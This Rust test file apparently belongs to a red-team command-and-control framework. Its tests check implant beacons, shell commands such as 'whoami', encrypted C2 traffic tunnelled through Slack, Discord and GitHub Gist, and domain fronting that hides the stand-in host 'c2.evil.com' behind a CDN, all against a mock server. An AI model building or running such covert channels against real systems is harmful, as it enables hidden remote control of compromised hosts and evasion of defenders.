use aegis_orchestrator::c2_https::*;
use aegis_orchestrator::c2_protocol::*;

fn test_beacon() -> BeaconMessage {
    BeaconMessage {
        implant_id: "imp-https-01".to_string(),
        timestamp: 1700000000,
        hostname: "target-web".to_string(),
        username: "www-data".to_string(),
        os: "Ubuntu 22.04".to_string(),
        ip: "10.0.0.5".to_string(),
        payload_type: PayloadType::Checkin,
        data: b"alive".to_vec(),
    }
}

fn test_command() -> CommandMessage {
    CommandMessage {
        command_id: "hcmd-001".to_string(),
        implant_id: "imp-https-01".to_string(),
        command_type: CommandType::Shell,
        args: vec!["whoami".to_string()],
        timeout_secs: 30,
    }
}

#[test]
fn test_slack_roundtrip() {
    let key = SessionCipher::generate_key();
    let cipher = SessionCipher::new(&key);
    let msg = C2Message::Beacon(test_beacon());
    let json = encode_slack_message(&msg, &cipher).expect("encode");
    let decoded = decode_slack_message(&json, &cipher).expect("decode");
    match decoded {
        C2Message::Beacon(b) => assert_eq!(b.implant_id, "imp-https-01"),
        _ => panic!("expected Beacon"),
    }
}

#[test]
fn test_gist_roundtrip() {
    let key = SessionCipher::generate_key();
    let cipher = SessionCipher::new(&key);
    let msg = C2Message::Command(test_command());
    let content = encode_gist_content(&msg, &cipher).expect("encode");
    let decoded = decode_gist_content(&content, &cipher).expect("decode");
    match decoded {
        C2Message::Command(c) => assert_eq!(c.command_id, "hcmd-001"),
        _ => panic!("expected Command"),
    }
}

#[test]
fn test_discord_roundtrip() {
    let key = SessionCipher::generate_key();
    let cipher = SessionCipher::new(&key);
    let msg = C2Message::Beacon(test_beacon());
    let json = encode_discord_message(&msg, &cipher).expect("encode");
    let decoded = decode_discord_message(&json, &cipher).expect("decode");
    match decoded {
        C2Message::Beacon(b) => assert_eq!(b.hostname, "target-web"),
        _ => panic!("expected Beacon"),
    }
}

#[test]
fn test_domain_front_headers_contain_host() {
    let config = DomainFrontConfig {
        front_domain: "cdn.cloudflare.com".to_string(),
        actual_host: "c2.evil.com".to_string(),
        path_prefix: "/api/".to_string(),
    };
    let headers = build_domain_front_headers(&config);
    let host_val = headers
        .iter()
        .find(|(k, _)| k == "Host")
        .map(|(_, v)| v.as_str());
    assert_eq!(host_val, Some("c2.evil.com"));
}

#[test]
fn test_slack_full_flow() {
    let key = SessionCipher::generate_key();
    let http = MockHttpServer::new();
    let config = HttpsC2Config {
        provider: SaasProvider::Slack,
        webhook_url: "https://hooks.slack.com/test".to_string(),
        poll_url: "https://slack.com/api/test".to_string(),
        polling_interval_ms: 1000,
        domain_fronting: None,
        jitter_pct: 0.1,
    };

    let client = HttpsC2Client::new(config.clone(), &key, http.clone());
    let mut server = HttpsC2Server::new(config, &key, http);

    client
        .send_beacon(&C2Message::Beacon(test_beacon()))
        .expect("send");
    let recv = server.poll_beacon().expect("poll").expect("msg");
    assert!(matches!(recv, C2Message::Beacon(_)));

    server.send_command(&test_command()).expect("send cmd");
    let cmd = client.poll_command().expect("poll").expect("cmd");
    assert_eq!(cmd.command_id, "hcmd-001");
}

#[test]
fn test_mock_http_server_operations() {
    let server = MockHttpServer::new();
    server.post_webhook("a");
    server.post_webhook("b");
    assert_eq!(server.pending_count(), 2);
    assert_eq!(server.poll_message().as_deref(), Some("a"));
    assert_eq!(server.pending_count(), 1);
}
